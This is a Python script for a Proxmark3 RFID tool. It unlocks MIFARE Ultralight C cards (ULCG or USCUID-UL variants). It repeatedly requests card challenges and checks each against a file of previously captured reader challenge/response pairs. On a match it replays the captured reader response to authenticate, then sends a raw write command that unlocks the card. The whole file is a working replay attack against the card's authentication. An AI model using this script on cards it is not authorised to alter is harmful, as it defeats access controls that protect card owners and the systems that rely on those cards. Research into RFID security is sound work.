#!/usr/bin/env -S uv run --with pycryptodome pm3 -y
import argparse
import sys
import json
import pm3

required_version = (3, 8)
if sys.version_info < required_version:
    print(f"Python version: {sys.version}")
    print(f"The script needs at least Python v{required_version[0]}.{required_version[1]}. Abort.")
    exit()


def unlock(num_challenges: int, challenges: dict, wait_time: int, p):
    """
    Unlock an ULCG or an USCUID-UL using a Proxmark device, based on captured reader challenges.

    Args:
        num_challenges (int): The number of challenge ciphertexts to collect.
        challenges (dict): A dictionary of challenge pairs in hexadecimal string format:
          {"ERndB": "ERndARndB'",...}
        p: An instance of the Proxmark client interface.

    Raises:
        RuntimeError: If an Ultralight C card is not detected.
    """
    # Sanity check: make sure an Ultralight C is on the Proxmark
    p.console("hf 14a info")
    if "MIFARE Ultralight C" not in p.grabbed_output:
        print("[-] Error: \033[1;31mUltralight C not placed on Proxmark\033[0m")
        return
    else:
        print("[+] Ultralight C detected. Keep stable on Proxmark during the attack.")

    for _ in range(num_challenges):
        if wait_time:
            p.console(f"hf 14a raw -sckw {wait_time} 1A00")
        else:
            p.console("hf 14a raw -sck 1A00")
        challenge = p.grabbed_output.split()
        if (len(challenge) > 8) and (challenge[1] == "AF"):
            hex_challenge = "".join(challenge[2:10])
            print(hex_challenge)
            if hex_challenge in challenges:
                print("[+] Challenge matched!")
                print("[+] Sending step2...")
                p.console("hf 14a raw -ck AF" + challenges[hex_challenge])
                reply = p.grabbed_output.split()
                print("[+] Reply: " + " ".join(reply))
                print("[+] Sending unlock command...")
                p.console("hf 14a raw -c a2 2a 30000000")
                reply = p.grabbed_output.split()
                print("[+] Reply: " + " ".join(reply))
                p.console("hf 14a reader --drop", capture=False)
                break
    p.console("hf 14a reader --drop", capture=False)


def main():
    """
    Unlock ULCG or USCUID-UL based on captured reader challenges.

    Command-line arguments:
    -c, --challenges: Set number of challenges to collect (default: 1000)
    -j, --json: Path to JSON file with dict of card nonces & reader nonces in hex strings:
         {"ERndB": "ERndARndB'",...}
    """
    parser = argparse.ArgumentParser(description='A script to collect ULC challenges.')
    parser.add_argument('-c', '--challenges',
                        help='Set number of challenges to collect', type=int, default=1000)
    parser.add_argument('-j', '--json',
                        help='Path to JSON file with dict of card nonces & reader nonces in hex strings', type=str)
    parser.add_argument('-w', '--wait',
                        help='Set wait time in microseconds after select', type=int)
    args = parser.parse_args()
    num_challenges = args.challenges
    jsonfile = args.json
    wait_time = args.wait

    with open(jsonfile, "r") as f:
        challenges = json.load(f)
        print(f"[+] Challenges loaded from {jsonfile}")

    p = pm3.pm3()
    unlock(num_challenges, challenges, wait_time, p)


if __name__ == '__main__':
    main()
